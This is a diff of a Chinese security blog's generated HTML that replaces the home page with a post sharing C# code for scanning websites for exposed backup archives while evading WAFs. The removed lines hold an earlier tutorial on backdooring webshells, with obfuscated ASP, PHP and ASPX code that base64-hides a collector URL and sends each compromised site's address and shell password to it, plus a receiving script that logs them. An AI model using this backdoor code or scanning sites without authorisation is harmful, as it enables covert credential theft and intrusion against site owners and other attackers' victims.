@@ -60,15 +60,22 @@
 
 
 
-<meta name="description" content="活着便是精彩!">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Mushroom’s Blog">
-<meta property="og:url" content="http://0xmg.github.io/index.html">
+<meta name="description" content="以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。
+正文  好了，废话不多说，先把Code贴一下
+  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748	    try">
+<meta property="og:type" content="article">
+<meta property="og:title" content="更加准确的扫描网站备份 - c#">
+<meta property="og:url" content="http://0xmg.github.io/2016/06/14/WebBackScan/index.html">
 <meta property="og:site_name" content="Mushroom’s Blog">
-<meta property="og:description" content="活着便是精彩!">
+<meta property="og:description" content="以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。
+正文  好了，废话不多说，先把Code贴一下
+  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748	    try">
+<meta property="og:updated_time" content="2016-06-14T14:02:37.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mushroom’s Blog">
-<meta name="twitter:description" content="活着便是精彩!">
+<meta name="twitter:title" content="更加准确的扫描网站备份 - c#">
+<meta name="twitter:description" content="以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。
+正文  好了，废话不多说，先把Code贴一下
+  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748	    try">
 
 
 
@@ -89,9 +96,9 @@
 
 
 
-  <link rel="canonical" href="http://0xmg.github.io/"/>
+  <link rel="canonical" href="http://0xmg.github.io/2016/06/14/WebBackScan/"/>
 
-  <title> Mushroom’s Blog </title>
+  <title> 更加准确的扫描网站备份 - c# | Mushroom’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -112,9 +119,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -201,9 +206,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -223,10 +228,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2016/06/14/WebBackScan/" itemprop="url">
-                  更加准确的扫描网站备份 - c#
-                </a>
+                更加准确的扫描网站备份 - c#
               
             
           </h1>
@@ -273,24 +275,25 @@
       
 
       
-        
-          
-            <p>  以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。</p>
+        <p>  以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>  好了，废话不多说，先把Code贴一下</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">	    try</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(thisurl));</span><br><span class="line">        <span class="keyword">if</span> ((thisurl).Contains(<span class="string">"https://"</span>))</span><br><span class="line">            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(CheckValidationResult);               //如果包含HTTPS则走SSL协议</span><br><span class="line">        httpWebRequest.Method = <span class="string">"GET"</span>;                                             //get方式请求</span><br><span class="line">        httpWebRequest.KeepAlive = <span class="literal">false</span>;                                           //不保持与站点的连接</span><br><span class="line">        httpWebRequest.AllowAutoRedirect = <span class="literal">false</span>;                              //拒绝302重定向</span><br><span class="line">        ServicePointManager.DefaultConnectionLimit = 50;                   //最大默认连接数</span><br><span class="line">        httpWebRequest.ReadWriteTimeout = 250;                               //这里是读写超时这里设置0.25秒</span><br><span class="line">        httpWebRequest.Proxy = null;                                                   //M7大牛说这个代理设置为NULL会快一点不知道是不是真的</span><br><span class="line">        httpWebRequest.Timeout = 500;                                               //超时时间为0.5秒</span><br><span class="line">        httpWebRequest.UserAgent = <span class="string">"User-Agent\tBaiduspider"</span>;</span><br><span class="line">        httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();</span><br><span class="line">        <span class="keyword">if</span> (httpWebResponse.StatusCode == HttpStatusCode.OK)</span><br><span class="line">        &#123;</span><br><span class="line">            Stream stream = httpWebResponse.GetResponseStream();</span><br><span class="line">            byte[] buffers = new byte[6];                                                 //定义一个大小为6的字节数组</span><br><span class="line">            stream.Read(buffers, 0, buffers.Length);                               ////读取流的前6个字节</span><br><span class="line">            string judge = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (int p = 0; p &lt; buffers.Length; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                judge += buffers[p].ToString(<span class="string">"X2"</span>);                                     //将流转为16进制</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (judge.Contains(<span class="string">"526172"</span>) || judge.Contains(<span class="string">"504B"</span>))                           //如果包含526172或者504B那么就存在备份文件。</span><br><span class="line">            &#123;</span><br><span class="line">                m_shougonglistview1 = new shougonglistviewone(addlistview1shougong);</span><br><span class="line">                this.Invoke(m_shougonglistview1, new Object[] &#123; thisurl, GetFileCount(thisurl), <span class="string">"backsuccess"</span> &#125;);</span><br><span class="line">                toolStripStatusLabel4.Text = <span class="string">"   已扫描到: "</span> + listView1.Items.Count.ToString() + <span class="string">"条   "</span>;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                //Console.WriteLine(<span class="string">"不存在备份文件："</span> + thisurl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (thisurl != string.Empty)</span><br><span class="line">        &#123;</span><br><span class="line">            toolStripStatusLabel2.Text = <span class="string">"   当前挂扫描: "</span> + thisurl + <span class="string">"               "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  `</span><br></pre></td></tr></table></figure>
 <h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>   基本原理就是将HTTP/HTTPS访问获取到的流转换为16进制，查找如果包含526172或者504B那么就存在备份文件。</p>
 <h3 id="软件下载地址"><a href="#软件下载地址" class="headerlink" title="软件下载地址"></a>软件下载地址</h3><p>  (<a href="http://0xmg.com/Tools/WebBackScan.rar" target="_blank" rel="external">http://0xmg.com/Tools/WebBackScan.rar</a>)</p>
 
-          
+      
+    </div>
+
+    <div>
+      
         
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
@@ -298,248 +301,32 @@
       
 
       
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
+              <a href="/2016/06/13/WebShell BackDoor/" rel="next" title="手把手教你写后门 - WebShell后门">
+                <i class="fa fa-chevron-left"></i> 手把手教你写后门 - WebShell后门
+              </a>
             
-              
-                
-                <a class="post-title-link" href="/2016/06/13/WebShell BackDoor/" itemprop="url">
-                  手把手教你写后门 - WebShell后门
-                </a>
-              
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-06-13T22:43:59+08:00" content="2016-06-13">
-              2016-06-13
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/06/13/WebShell BackDoor/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/13/WebShell BackDoor/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
+          </div>
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <p>  写这篇文章的目的很单纯!</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>  好了，废话不多说，一个WebShell后门的必须条件有三个</p>
-<p>  1、1个域名<br>  2、1个收信文件<br>  3、1个WebShell(asp|php|aspx木马)</p>
-<p>  asp的后门代码如下：</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XmlSend(<span class="string">"http://www.xxx.com/backdoor.asp?shell="</span>&amp;Request.ServerVariables(<span class="string">"Server_Name"</span>)&amp;request(<span class="string">"url"</span>)&amp;&amp;UserPass)</span><br><span class="line">Function XmlSend(Posturl)</span><br><span class="line">dim w</span><br><span class="line">w=<span class="string">"^w^inhttp.^wi^nhttprequest.5.1"</span></span><br><span class="line">Posturl=replace(trim(Posturl),vbcrlf,<span class="string">""</span>)</span><br><span class="line">on error resume next</span><br><span class="line"><span class="built_in">set</span> http= CreateObject(replace(w,<span class="string">"^"</span>,<span class="string">""</span>))</span><br><span class="line">http.open <span class="string">"POST"</span>,Posturl,<span class="literal">false</span></span><br><span class="line">http.send</span><br><span class="line">Set http=Nothing</span><br><span class="line">End Function</span><br><span class="line"> `</span><br></pre></td></tr></table></figure>
-<p>  php的后门代码如下:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">set</span>_time_<span class="built_in">limit</span>(100);</span><br><span class="line"><span class="variable">$slstss</span>=<span class="string">"fi"</span>.<span class="string">"le_"</span>.<span class="string">"ge"</span>.<span class="string">"t_c"</span>.<span class="string">"onten"</span>.<span class="string">"ts"</span>;</span><br><span class="line"><span class="variable">$raworistr</span>=<span class="string">'%'</span>.<span class="string">'@'</span>.<span class="string">'^'</span>.<span class="string">'*'</span>.<span class="string">'('</span>.<span class="string">'&amp;'</span>.<span class="string">'!'</span>.<span class="string">'#'</span>;</span><br><span class="line"><span class="variable">$serveru</span> = <span class="variable">$_SERVER</span> [<span class="string">'HTTP_HOST'</span>].<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="variable">$dedeedoc</span>=<span class="string">"b"</span>.<span class="string">"ase6"</span>.<span class="string">"4_d"</span>.<span class="string">"ec"</span>.<span class="string">"od"</span>.<span class="string">"e"</span>;</span><br><span class="line"><span class="variable">$serverp</span> = <span class="variable">$psw</span>;</span><br><span class="line"><span class="variable">$rawstruri</span>=<span class="string">'aHR0cDovL3d3dy54eHguY29tL2JhY2tkb29yLmFzcD9zaGVsbD0='</span>;</span><br><span class="line"><span class="variable">$rawtargetu</span>=str_replace(<span class="variable">$raworistr</span>,<span class="string">''</span>,<span class="variable">$rawstruri</span>);</span><br><span class="line"><span class="variable">$ropcyiu</span> = <span class="variable">$dedeedoc</span>(<span class="variable">$rawtargetu</span>);</span><br><span class="line"><span class="variable">$uistauast</span>=<span class="variable">$ropcyiu</span>.<span class="variable">$serveru</span>.<span class="string">'|'</span>.<span class="variable">$serverp</span>;</span><br><span class="line"><span class="variable">$uistauast</span>=urldecode(<span class="variable">$uistauast</span>);</span><br><span class="line"><span class="variable">$rubote</span>=<span class="variable">$slstss</span>(<span class="variable">$uistauast</span>);</span><br></pre></td></tr></table></figure></p>
-<p>  aspx的后门代码如下:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  try</span><br><span class="line">&#123;</span><br><span class="line">    WebClient client = new WebClient();</span><br><span class="line">    client.DownloadString(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String((<span class="string">" aHR0cDovL3d3dy54eHguY29tL"</span>.TrimStart().Replace(<span class="string">"%"</span>, string.Empty) + <span class="string">"2JhY2tkb29yLmFzcD9zaGVsbD0= "</span>.TrimEnd().Replace(<span class="string">"#"</span>, string.Empty)))) + this.Request.Url.ToString() + <span class="string">"|"</span> + this.B<span class="keyword">in</span>_TextBox_Login.Text);</span><br><span class="line"> &#125;</span><br><span class="line">catch (Exception)</span><br><span class="line"> &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>  shell.asp收信的代码如下:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  &lt;%</span><br><span class="line">Function WriteTxt(file,date)</span><br><span class="line">  SitePath = Server.Mappath(<span class="string">"/mgWebShell00544"</span>) &amp; file</span><br><span class="line">  Set FSO=Server.CreateObject(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line">  IF FSO.FileExists(SitePath) Then</span><br><span class="line">  Set MyFile=FSO.OpenTextFile(SitePath,8)<span class="string">'打开文件</span><br><span class="line">  tmp = FSO.OpenTextfile(SitePath,1, False).Readall</span><br><span class="line">  If Instr(tmp, date) = 0 Then </span><br><span class="line">  MyFile.WriteLine("URL="&amp;date)</span><br><span class="line">  Set MyFile=Nothing</span><br><span class="line">  Set FSO=Nothing</span><br><span class="line">  Else</span><br><span class="line">  End If</span><br><span class="line"></span><br><span class="line">  Else</span><br><span class="line">  Set FSO=Server.CreateObject("Scripting.FileSystemObject")</span><br><span class="line">  Call FSO.CreateTextFile(SitePath, True)</span><br><span class="line">  Set MyFile=FSO.OpenTextFile(SitePath,8)'</span>打开文件</span><br><span class="line">  MyFile.WriteLine(<span class="string">"URL="</span>&amp;date)</span><br><span class="line">  Set MyFile=Nothing</span><br><span class="line">  Set FSO=Nothing </span><br><span class="line">  </span><br><span class="line">  End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">If Request.QueryString&lt;&gt;<span class="string">""</span> Then </span><br><span class="line">sb = Request.QueryString(<span class="string">"sb"</span>)</span><br><span class="line">Call WriteTxt(<span class="string">"\"&amp;Month(now())&amp;"</span>----------<span class="string">"&amp;Day(now())&amp;"</span>.txt<span class="string">",sb)</span><br><span class="line">End If</span><br><span class="line">%&gt;</span></span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-      
 
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/12/终于折腾完了!/" itemprop="url">
-                  终于折腾完了!
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-06-12T15:52:26+08:00" content="2016-06-12">
-              2016-06-12
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/灰产/" itemprop="url" rel="index">
-                    <span itemprop="name">灰产</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/06/12/终于折腾完了!/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/12/终于折腾完了!/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>  从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>整理一下会常用到的命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br><span class="line">$ hexo server</span><br><span class="line">$ hexo generate</span><br><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></p>
-
-          
-        
+    <div class="post-spread">
       
     </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-  </section>
-
-  
+  </div>
 
 
           </div>
@@ -547,6 +334,14 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/06/14/WebBackScan/"
+           data-title="更加准确的扫描网站备份 - c#" data-url="http://0xmg.github.io/2016/06/14/WebBackScan/">
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -566,8 +361,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -644,6 +448,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">1.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本原理"><span class="nav-number">1.1.</span> <span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#软件下载地址"><span class="nav-number">1.2.</span> <span class="nav-text">软件下载地址</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -740,6 +555,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
